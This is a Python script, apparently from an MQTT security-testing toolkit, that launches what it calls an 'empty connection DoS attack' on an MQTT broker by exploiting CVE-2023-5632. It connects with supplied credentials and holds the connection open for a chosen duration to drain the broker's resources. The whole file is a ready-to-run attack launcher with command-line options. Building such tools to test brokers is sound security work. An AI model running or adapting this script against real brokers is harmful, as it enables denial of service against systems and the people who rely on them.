import argparse
import mqtt_utilities as util
import paho.mqtt.client as mqtt
import time
import random


def main(username, password, duration=10):
    """The empty connection dos attack establishes empty connection with the broker and consumes the resources of the system by exploiting the CVE-2023-5632 vulnerability"""
    start_time = time.time()
    client = mqtt.Client(
        mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv311)
    client.username_pw_set(username, password)
    client.on_connect = util.on_connect
    client.on_disconnect = util.on_disconnect
    client.on_publish = util.on_publish

    if util.connect_client(client):
        while True:
            time.sleep(random.random() * 10)
            elapsed_time = time.time() - start_time
            print("Execution time: " + str(elapsed_time), flush=True)
            if elapsed_time >= duration:
                print("Time elapsed, execution is terminating...", flush=True)
                client.disconnect()
                return
    else:
        print(f"Broker not reachable, ending script...", flush=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="launch an empty_con_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=float, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    args = parser.parse_args()
    main(args.username, args.password, args.duration)
